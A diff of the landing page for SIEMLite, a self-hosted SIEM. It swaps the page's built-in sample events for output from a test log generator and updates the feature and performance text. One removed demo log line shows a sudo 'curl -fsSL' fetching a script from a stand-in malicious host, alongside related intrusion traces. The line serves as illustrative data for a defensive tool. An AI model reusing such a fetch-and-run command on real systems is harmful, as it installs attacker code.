@@ -4,9 +4,9 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>SIEMLite: a SIEM in a single Go binary</title>
-<meta name="description" content="SIEMLite is a self-hosted SIEM in one Go binary. Collect logs over HTTPS or syslog, read them with parsers you build (with help from a local AI model), check every event against threat intel, and search it all from a quiet web UI.">
+<meta name="description" content="SIEMLite is a self-hosted SIEM in one Go binary. Collect logs over HTTPS or syslog, read them with parsers you build (with help from a local AI model), check every event against threat intel, and search it all from a quiet web UI. Includes loggen, a test log generator that works with any SIEM.">
 <meta property="og:title" content="SIEMLite: a SIEM in a single Go binary">
-<meta property="og:description" content="Collect, read and search your security logs with one binary and one SQLite file.">
+<meta property="og:description" content="Collect, read and search your security logs with one binary and plain SQLite files.">
 <meta property="og:image" content="https://justwaters.github.io/SIEMLite/screenshots/dashboard-dark.webp">
 <meta name="color-scheme" content="light dark">
 <style>
@@ -49,7 +49,7 @@
   .top nav a { display: inline-flex; align-items: center; min-height: 44px; padding: 0 12px; font-size: 15px; color: var(--ink-2); text-decoration: none; border-radius: 6px; }
   .top nav a:hover { color: var(--ink); background: var(--raised); }
 
-  /* Hero: the product's own search, working on sample events */
+  /* Hero: the product's own search, working on events from loggen */
   .hero { padding: 72px 0 40px; }
   .hero h1 { font-size: clamp(40px, 6.4vw, 76px); line-height: 1.02; letter-spacing: -.035em; font-weight: 600; font-stretch: 82%;
              margin: 0 0 22px; max-width: 13ch; }
@@ -199,25 +199,25 @@
     <div class="wrap">
       <h1>A SIEM in a single Go binary.</h1>
       <p class="lead">Collect logs over HTTPS or syslog, teach SIEMLite to read them, check every event against threat intel,
-        and search it all from one quiet page. One executable, one SQLite file, one command to run it with Docker.</p>
+        and search it all from one quiet page. One executable, plain SQLite files, one command to run it with Docker.</p>
       <div class="cta">
         <a class="btn primary" href="#quickstart">Get started</a>
         <a class="btn" href="https://github.com/justwaters/SIEMLite">View on GitHub</a>
         <span class="license">Open source under the AGPL-3.0</span>
       </div>
 
-      <div class="demo" role="search" aria-label="Try searching sample events">
+      <div class="demo" role="search" aria-label="Try searching test events">
         <label class="demo-field">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4.5 4.5"/></svg>
-          <span class="visually-hidden">Search the sample events</span>
+          <span class="visually-hidden">Search the test events</span>
           <input id="demo-q" placeholder="Search your logs" autocomplete="off" spellcheck="false">
           <span class="demo-count" id="demo-count" aria-live="polite"></span>
         </label>
         <ul class="demo-rows" id="demo-rows"></ul>
         <div class="demo-foot">
-          <span>These are events from SIEMLite&rsquo;s built-in sample data. Try</span>
+          <span>These are test events made by loggen, the log generator that comes with SIEMLite. Try</span>
           <button type="button" data-q="failed password">failed password</button>
-          <button type="button" data-q="203.0.113.7">203.0.113.7</button>
+          <button type="button" data-q="198.51.100.200">198.51.100.200</button>
           <button type="button" data-q="nginx">nginx</button>
           <button type="button" data-q="">show all</button>
         </div>
@@ -225,29 +225,29 @@
       <picture>
         <source srcset="screenshots/dashboard-dark.webp" media="(prefers-color-scheme: dark)">
         <img class="shot hero-shot" src="screenshots/dashboard-light.webp" width="2880" height="1800"
-          alt="The SIEMLite Dashboard: a search field over the last 24 hours, with about 400 events, 69 threat intel matches, 15 events rated High or worse and 6 open alerts, a chart of events per hour with threat matches in red, and lists by severity, busiest sources and IPs on threat lists.">
+          alt="The SIEMLite Dashboard: a search field over the last 24 hours, with 14.3K events, 55 threat intel matches, 407 events rated High or worse and 35 open alerts, a chart of events per hour with threat matches in red, and lists by severity, busiest sources and IPs on threat lists.">
       </picture>
-      <p class="caption">The Dashboard: the last 24 hours at a glance, with threat matches in red and the alerts waiting for you.</p>
+      <p class="caption">The Dashboard: the last 24 hours at a glance, with threat matches in red and the alerts waiting for you. The events came from loggen.</p>
     </div>
   </div>
 
   <section id="see-it">
     <div class="wrap">
       <h2>From a line of text to an answer</h2>
-      <p class="intro">Every screenshot here is SIEMLite itself, running its sample data: a day of ordinary traffic with an
-        intrusion hidden in it. Turn on Sample data in the sidebar to explore the same events.</p>
+      <p class="intro">Every screenshot here is SIEMLite itself, fed by loggen: a day of ordinary traffic from a small company, with
+        brute-force attacks hidden in it. Run <code>loggen -eps 10</code> next to your own copy to get the same kind of events.</p>
       <div class="tour">
         <div class="tour-row">
           <div class="tour-text">
             <h3>Find out what happened</h3>
             <p>The Database lists every event, newest first. Search words and phrases, set a date range, filter by source,
               severity, IP, user or country, and open any event for the full story.</p>
-            <p>Here, a login from an address on a botnet list, with where it came from and the exact line that was logged.</p>
+            <p>Here, a failed SSH login from an address on a botnet list, with the exact line that was logged.</p>
           </div>
           <picture>
             <source srcset="screenshots/database-dark.webp" media="(prefers-color-scheme: dark)">
             <img class="shot" src="screenshots/database-light.webp" width="2880" height="1800" loading="lazy"
-              alt="The Database filtered to threat intel matches. An opened event explains that 203.0.113.7 is on a threat list for an SSH brute-force botnet, shows it logged in as admin on web1 from Moscow, and lists the failed password attempts that came before.">
+              alt="The Database filtered to threat intel matches. An opened event explains that 192.0.2.139 is on a threat list for an SSH brute-force botnet, and shows a failed password for oracle on bastion-01 with the original log line.">
           </picture>
         </div>
         <div class="tour-row flip">
@@ -262,7 +262,7 @@
           <picture>
             <source srcset="screenshots/alerts-dark.webp" media="(prefers-color-scheme: dark)">
             <img class="shot" src="screenshots/alerts-light.webp" width="2880" height="1800" loading="lazy"
-              alt="The Alerts page with six open alerts from the sample data: threat intel matches from 10.0.0.5, 203.0.113.7 and 192.0.2.45, an SSH brute force from 203.0.113.7 with 13 events, and a critical event on web1, each with View events, Acknowledge and Close buttons.">
+              alt="The Alerts page with 35 open alerts from loggen's attacks: critical events on workstations, SSH brute force alerts for several addresses with 13 to 16 events each, and threat intel matches, each with View events, Acknowledge and Close buttons.">
           </picture>
         </div>
         <div class="tour-row">
@@ -275,19 +275,20 @@
           <picture>
             <source srcset="screenshots/parser-dark.webp" media="(prefers-color-scheme: dark)">
             <img class="shot" src="screenshots/parser-light.webp" width="2880" height="1800" loading="lazy"
-              alt="The parser editor for a web shop's access log: a pattern with source IP, user, time, method, path and status fields, severity decided by the status code, and a preview reading all three sample lines.">
+              alt="The parser editor for the Log generator parser: a pattern with time, host, app, level, action, address, port and user fields, severity decided by the level, and a preview reading all four sample lines.">
           </picture>
         </div>
         <div class="tour-row flip">
           <div class="tour-text">
             <h3>Know where every log comes from</h3>
             <p>Each application sends with its own access token, which can only send logs. The Sources page shows when each one
-              last sent anything, so a quiet source stands out, and which parser reads it.</p>
+              last sent anything, so a quiet source stands out, and which parser reads it. A Log generator source is
+              set up for you on first start.</p>
           </div>
           <picture>
             <source srcset="screenshots/sources-dark.webp" media="(prefers-color-scheme: dark)">
             <img class="shot" src="screenshots/sources-light.webp" width="2880" height="1800" loading="lazy"
-              alt="The Sources page: the syslog listener, logs added in the UI, sample data, and three access tokens. Web shop and Office firewall were used just now and each has its own parser; Billing service has never been used.">
+              alt="The Sources page: the syslog listener, logs added in the UI, the INTERNAL audit log, and four access tokens. Log generator, Web shop and Office firewall were used just now and each has its own parser; Billing service has never been used.">
           </picture>
         </div>
         <div class="tour-row">
@@ -309,7 +310,7 @@
           <picture>
             <source srcset="screenshots/phone-dark.webp" media="(prefers-color-scheme: dark)">
             <img class="shot" src="screenshots/phone-light.webp" width="780" height="1688" loading="lazy"
-              alt="The Dashboard on a phone: the search field, the event, threat match and high-severity counts, and the chart of events per hour.">
+              alt="The Dashboard on a phone: the search field, the counts of events, threat matches, high-severity events and open alerts, and the start of the chart of events per hour.">
           </picture>
         </div>
       </div>
@@ -342,9 +343,18 @@
           <h3>Investigate<span>Finding answers</span></h3>
           <dl>
             <div><dt>Dashboard</dt><dd>Events, threat matches and severity over the last day, week or month, and the sources and IPs behind them.</dd></div>
-            <div><dt>Fast search</dt><dd>Words, phrases, <code>AND</code>, <code>OR</code> and prefixes over full log text, with dates and filters, in milliseconds, even across millions of events.</dd></div>
+            <div><dt>Fast search</dt><dd>Words, phrases, <code>AND</code>, <code>OR</code> and prefixes over full log text, with dates and filters, in milliseconds. A search with dates opens only the days it needs.</dd></div>
             <div><dt>Alerts</dt><dd>Rules count matching events per address, user or host and open an alert when there are too many. Four are built in, including SSH brute force and threat intel matches.</dd></div>
-            <div><dt>Sample data</dt><dd>One switch loads a realistic day with an intrusion to investigate. Turn it off and only the sample goes.</dd></div>
+            <div><dt>Test logs</dt><dd><code>loggen</code> sends realistic logs with attacks in them, 1 to a million events a second, so there is something to search and alert on from the first minute.</dd></div>
+          </dl>
+        </div>
+        <div class="group" id="loggen-group">
+          <h3>Test<span>Trying it, or any SIEM</span></h3>
+          <dl>
+            <div><dt>A company to watch</dt><dd><code>loggen</code> invents a small company: a firewall, two web servers, an SSH bastion, VPN, DNS, a database, mail, backups and workstation antivirus. Attacks are mixed in: SSH brute force, port scans, malware calling home and password spraying against the VPN.</dd></div>
+            <div><dt>Any rate</dt><dd>Send 1, 10, 100, 1k, 10k, 100k or 1m events a second, to SIEMLite over HTTPS or to any SIEM over syslog (UDP or TCP). When SIEMLite is busy it says so and loggen sends the rest again, so nothing is lost.</dd></div>
+            <div><dt>Works out of the box</dt><dd>On first start SIEMLite sets up a Log generator parser and an access token, and saves the token next to the database. <code>loggen -eps 10</code> then needs no options. It ships in the Docker image and in release downloads.</dd></div>
+            <div><dt>Open to other SIEMs</dt><dd>It lives in the repository under <code>cmd/loggen</code>, uses only Go&rsquo;s standard library, and <code>-seed</code> repeats the same logs, so you can compare SIEMs on the same input. Each line is <code>time|host|app|level|action|src_ip|src_port|dst_ip|dst_port|user|message</code>.</dd></div>
           </dl>
         </div>
         <div class="group">
@@ -352,9 +362,9 @@
           <dl>
             <div><dt>Users and roles</dt><dd>Admins and Standard users; Standard users can be limited to chosen sources.</dd></div>
             <div><dt>Audit log</dt><dd>Sign-ins, failed sign-ins and every change, from the web or the command line, are recorded as searchable events.</dd></div>
-            <div><dt>Backups</dt><dd>Consistent backups while it runs, on a schedule or on demand. Download them, upload them elsewhere, restore in seconds.</dd></div>
+            <div><dt>Backups</dt><dd>Consistent backups while it runs, on a schedule or on demand, as one <code>.tar.gz</code> of every file. Download them, upload them elsewhere, restore in seconds.</dd></div>
             <div><dt>HTTPS only</dt><dd>No plain-HTTP port to forget to close. A certificate is generated on first start, or bring your own.</dd></div>
-            <div><dt>Retention</dt><dd>Events older than your window, 30 days by default, are deleted and the disk space is given back.</dd></div>
+            <div><dt>Retention</dt><dd>Events are stored one file per day, so those older than your window, 30 days by default, are deleted a day at a time and the disk space is given back.</dd></div>
             <div><dt>Easy to run</dt><dd>Download a binary for Linux, macOS or Windows, or run the image for x86-64 and ARM64. With the repository, <code>docker compose up -d --build</code> runs it and the same command after <code>git pull</code> upgrades it.</dd></div>
           </dl>
         </div>
@@ -365,22 +375,25 @@
   <section id="performance">
     <div class="wrap">
       <h2>Fast on a small machine</h2>
-      <p class="intro">Measured with SIEMLite&rsquo;s own load tests on an AMD Ryzen Embedded R2544 (4 cores) with
-        14 GB of memory and an SSD. Searches are the slowest of every 20, with 16 people searching at once.</p>
+      <p class="intro">Version 0.8, measured with SIEMLite&rsquo;s own load tests on 500,000 events spread over 30 days, with 8
+        senders. The machine is small: an AMD Ryzen Embedded R2544 (4 cores) with 14 GB of memory and an SSD. Each figure is
+        the 95th percentile with many clients working at once.</p>
       <table class="api perf">
-        <thead><tr><th>Workload</th><th>Result</th></tr></thead>
+        <thead><tr><th>Workload (500,000 events)</th><th>Result</th></tr></thead>
         <tbody>
-          <tr><td>Logs over HTTPS from 32 apps at once</td><td>3,700 events a second stored and searchable, about 320 million a day</td></tr>
-          <tr><td>Syslog over UDP at 4,000 messages a second</td><td>300,000 sent, 300,000 stored</td></tr>
-          <tr><td>Search 5 million events for a word, an address or a user</td><td>4&ndash;27 ms</td></tr>
-          <tr><td>&hellip; for a phrase, three words, a host and severity</td><td>28&ndash;80 ms</td></tr>
-          <tr><td>&hellip; for a word within one day, or results 5,001&ndash;5,100</td><td>190&ndash;200 ms</td></tr>
-          <tr><td>Check alert rules against all 5 million events</td><td>7 seconds</td></tr>
-          <tr><td>Back up 5 million events (684 MB compressed) / restore them</td><td>33 seconds / 21 seconds</td></tr>
+          <tr><td>Logs over HTTPS from 8 senders</td><td>19,500 events a second stored and searchable</td></tr>
+          <tr><td>Syslog over TCP</td><td>21,000 lines a second</td></tr>
+          <tr><td>Filling storage directly</td><td>31,000 events a second</td></tr>
+          <tr><td>Searches: a word, a phrase, an address, a user, a host and severity</td><td>6&ndash;170 ms</td></tr>
+          <tr><td>Results 5,001&ndash;5,100 of a search</td><td>about 450 ms</td></tr>
+          <tr><td>The Dashboard</td><td>65 ms</td></tr>
+          <tr><td>First check of the alert rules</td><td>under 1 second</td></tr>
+          <tr><td>Back up everything / restore it</td><td>4 seconds / 2 seconds</td></tr>
         </tbody>
       </table>
-      <p class="caption perf-more">Version 0.7 made big searches much faster: on 500,000 events a common word went from 2.3 seconds to
-        20 milliseconds, and an address from 300 milliseconds to 1. Every commit is checked with a smaller run of the same
+      <p class="caption perf-more">Version 0.8 stores events about four times faster than 0.7: it keeps one file per day, inserts
+        many rows at once and updates the text index once per batch. For scale, version 0.7 searched 5 million events in 4&ndash;80 ms
+        for most searches. The runs are different sizes, so compare the figures loosely. Every commit is checked with a smaller run of the same
         tests, along with fuzzing, a test that runs everything at once, and a browser that clicks through every page.
         <a href="https://github.com/justwaters/SIEMLite#performance">How it&rsquo;s measured</a></p>
     </div>
@@ -404,7 +417,16 @@ docker compose up -d --build</pre>
           <h3>Sign in</h3>
           <p>The first start creates an <code>admin</code> account and prints its password once:</p>
 <pre>docker compose logs siemlite | grep -A1 'username: admin'</pre>
-          <p>Open <code>https://your-server:8443</code>, sign in, and turn on Sample data to look around.</p>
+          <p>Open <code>https://your-server:8443</code> and sign in. Your browser will warn about the self-signed certificate until you trust it or bring your own.</p>
+        </li>
+        <li>
+          <h3>See it work</h3>
+          <p>Nothing to look at yet? SIEMLite set up a Log generator source on first start. Send ten test events a second,
+            attacks included, and open the Dashboard:</p>
+<pre>docker compose exec siemlite loggen -eps 10
+<span class="c"># without Docker, in the folder where siemlite runs:</span>
+loggen -eps 10</pre>
+          <p>The brute-force attacks raise alerts within a minute or two. <code>loggen</code> comes with every release.</p>
         </li>
         <li>
           <h3>Send it logs</h3>
@@ -443,8 +465,8 @@ SIEMLITE_AI_URL=http://ollama:11434</pre>
         </tbody>
       </table>
       <p class="note"><b>Early-stage project.</b> Client-certificate (mTLS) verification and per-token rate limiting are
-        not built yet. Every pull request runs the tests with a race detector, load tests, fuzzing, a browser test, a Docker
-        build and Go&rsquo;s vulnerability scanner.</p>
+        not built yet. Every pull request runs the tests with a race detector, load tests, fuzzing, a browser test fed by loggen, a
+        Docker build for x86-64 and ARM64 and Go&rsquo;s vulnerability scanner.</p>
     </div>
   </section>
 </main>
@@ -457,29 +479,37 @@ SIEMLITE_AI_URL=http://ollama:11434</pre>
 </footer>
 
 <script>
-// The hero search: real events from SIEMLite's sample data, filtered as you
-// type. Times are relative to now so the list always reads as recent.
+// The hero search: events made by loggen, filtered as you type. Times are
+// relative to now so the list always reads as recent.
+// Each row: minutes ago, severity (1-5), host, source IP, message, app, action.
 const EVENTS = [
-  [3, 1, "Web shop", "10.0.0.41", "GET /api/orders HTTP/1.1 200", "nginx"],
-  [6, 2, "Office firewall", "203.0.113.48", "block in proto tcp from 203.0.113.48 to 10.0.0.5 port 3389", "firewall"],
-  [9, 1, "Syslog", "10.0.0.20", "Accepted publickey for deploy from 10.0.0.20 port 51022 ssh2", "sshd"],
-  [14, 3, "Web shop", "192.0.2.19", "POST /login HTTP/1.1 401", "nginx"],
-  [22, 4, "Sample data", "10.0.0.5", "block out on em0 proto tcp from 10.0.0.5 to 198.51.100.66 port 4444", "firewall", true],
-  [23, 5, "Sample data", "", "/tmp/.x/kworkerd: Unix.Trojan.Mirai-9971 FOUND", "clamd", true],
-  [24, 1, "Sample data", "", "admin : USER=root ; COMMAND=/usr/bin/curl -fsSL http://update.evil-cdn.example/i.sh", "sudo", true],
-  [25, 1, "Sample data", "10.0.0.5", "client 10.0.0.5#40211: query: update.evil-cdn.example IN A", "named", true],
-  [27, 1, "Sample data", "203.0.113.7", "Accepted password for admin from 203.0.113.7 port 50122 ssh2", "sshd", true],
-  [29, 3, "Sample data", "203.0.113.7", "Failed password for root from 203.0.113.7 port 48113 ssh2", "sshd", true],
-  [30, 3, "Sample data", "203.0.113.7", "Failed password for invalid user oracle from 203.0.113.7 port 51940 ssh2", "sshd", true],
-  [30, 3, "Sample data", "203.0.113.7", "Failed password for admin from 203.0.113.7 port 44021 ssh2", "sshd", true],
-  [31, 3, "Sample data", "203.0.113.7", "Failed password for invalid user ubuntu from 203.0.113.7 port 52211 ssh2", "sshd", true],
-  [38, 3, "Sample data", "192.0.2.45", "GET /.env HTTP/1.1 404", "nginx", true],
-  [38, 3, "Sample data", "192.0.2.45", "GET /wp-login.php HTTP/1.1 404", "nginx", true],
-  [44, 1, "Syslog", "10.0.0.31", "client 10.0.0.31#53211: query: mail.corp.example IN A", "named"],
-  [52, 1, "Web shop", "198.51.100.120", "GET /checkout HTTP/1.1 302", "nginx"],
-  [61, 4, "Sample data", "", "ERROR: could not extend file: No space left on device", "postgres"],
-  [75, 3, "Sample data", "198.51.100.77", "user bob authenticated from 198.51.100.77 port 40311", "openvpn"],
-  [90, 1, "Sample data", "192.0.2.10", "user bob authenticated from 192.0.2.10 port 51822", "openvpn"],
+  [4, 2, "web-02", "203.0.113.61", "POST /checkout 404 34782b 158ms \"Mozilla/5.0\"", "nginx", "http.request"],
+  [5, 1, "mail-01", "198.51.100.61", "message delivered to ivan@corp.example (61380 bytes)", "postfix", "mail.delivered"],
+  [5, 1, "vpn-01", "203.0.113.202", "grace connected, assigned 10.8.0.236", "openvpn", "vpn.login"],
+  [6, 1, "vpn-01", "192.0.2.180", "erin connected, assigned 10.8.0.145", "openvpn", "vpn.login"],
+  [8, 1, "web-01", "192.0.2.184", "POST /checkout 200 28746b 363ms \"python-requests/2.32\"", "nginx", "http.request"],
+  [9, 3, "bastion-01", "198.51.100.200", "Failed password for root from 198.51.100.200", "sshd", "auth.failure"],
+  [10, 3, "vpn-01", "198.51.100.245", "Authentication failed for carol", "openvpn", "vpn.login.failure"],
+  [11, 1, "bastion-01", "10.0.2.228", "Accepted publickey for dave from 10.0.2.228", "sshd", "auth.success"],
+  [11, 1, "web-01", "10.0.4.36", "POST /login 200 7431b 79ms \"Mozilla/5.0\"", "nginx", "http.request"],
+  [12, 1, "bastion-01", "10.0.5.51", "Accepted publickey for svc-deploy from 10.0.5.51", "sshd", "auth.success"],
+  [13, 1, "web-01", "198.51.100.139", "GET /account 200 33577b 124ms \"Mozilla/5.0\"", "nginx", "http.request"],
+  [16, 3, "bastion-01", "198.51.100.200", "Failed password for ubuntu from 198.51.100.200", "sshd", "auth.failure"],
+  [19, 1, "backup-01", "", "snapshot saved: 1228 files, 462 MiB added", "restic", "backup.completed"],
+  [19, 5, "ws-015", "", "Threat detected: Backdoor.Cobalt in C:\\Users\\frank\\Downloads\\invoice.pdf.exe; quarantine failed", "defender", "av.detection"],
+  [22, 1, "dns-01", "10.0.2.119", "query intranet.example A from 10.0.2.119", "named", "dns.query"],
+  [23, 1, "dns-01", "10.0.3.132", "query intranet.example A from 10.0.3.132", "named", "dns.query"],
+  [23, 2, "gw-edge-01", "198.51.100.76", "Blocked TCP 198.51.100.76 -> 10.0.0.1:110", "firewall", "deny"],
+  [24, 3, "bastion-01", "198.51.100.200", "Failed password for root from 198.51.100.200", "sshd", "auth.failure"],
+  [25, 3, "bastion-01", "198.51.100.200", "Failed password for oracle from 198.51.100.200", "sshd", "auth.failure"],
+  [26, 3, "vpn-01", "203.0.113.101", "Authentication failed for bob", "openvpn", "vpn.login.failure"],
+  [28, 2, "gw-edge-01", "203.0.113.235", "Blocked TCP 203.0.113.235 -> 10.0.0.1:1433", "firewall", "deny"],
+  [29, 3, "bastion-01", "198.51.100.200", "Failed password for test from 198.51.100.200", "sshd", "auth.failure"],
+  [30, 1, "web-01", "203.0.113.122", "GET /static/app.js 304 22933b 285ms \"Go-http-client/1.1\"", "nginx", "http.request"],
+  [32, 2, "gw-edge-01", "198.51.100.41", "Blocked TCP 198.51.100.41 -> 10.0.0.1:445", "firewall", "deny"],
+  [34, 3, "bastion-01", "198.51.100.200", "Failed password for admin from 198.51.100.200", "sshd", "auth.failure"],
+  [35, 3, "db-01", "10.0.2.10", "duration: 4527 ms statement: SELECT * FROM orders WHERE customer_id = 61669", "postgres", "db.slow_query"],
+  [35, 3, "bastion-01", "198.51.100.200", "Failed password for admin from 198.51.100.200", "sshd", "auth.failure"],
 ];
 const SEV = { 1: "Info", 2: "Low", 3: "Medium", 4: "High", 5: "Critical" };
 const rows = document.getElementById("demo-rows"), q = document.getElementById("demo-q"), count = document.getElementById("demo-count");
@@ -487,16 +517,15 @@ const now = Date.now();
 function el(tag, cls, text) { const e = document.createElement(tag); if (cls) e.className = cls; if (text != null) e.textContent = text; return e; }
 function render() {
   const words = q.value.toLowerCase().replace(/"/g, "").split(/\s+/).filter(Boolean);
-  const hits = EVENTS.filter((e) => words.every((w) => [e[2], e[3], e[4], e[5]].join(" ").toLowerCase().includes(w)));
+  const hits = EVENTS.filter((e) => words.every((w) => [e[2], e[3], e[4], e[5], e[6]].join(" ").toLowerCase().includes(w)));
   count.textContent = `${hits.length} of ${EVENTS.length}`;
   if (!hits.length) { rows.replaceChildren(el("li", "demo-none", "No events match. Try a word from one of the lines.")); return; }
   rows.replaceChildren(...hits.map((e) => {
-    const li = el("li", e[6] ? "threat" : "");
+    const li = el("li");
     const t = new Date(now - e[0] * 60000);
     const sev = el("span", "sev"); sev.style.setProperty("--c", `var(--sev-${e[1]})`);
     sev.append(el("i"), el("span", "", SEV[e[1]]));
     const msg = el("span", "msg");
-    if (e[6]) msg.append(el("span", "tag", "Threat intel"));
     msg.append(e[4]);
     li.title = e[4];
     li.append(el("span", "t", t.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })), sev, el("span", "src", e[2]), msg);
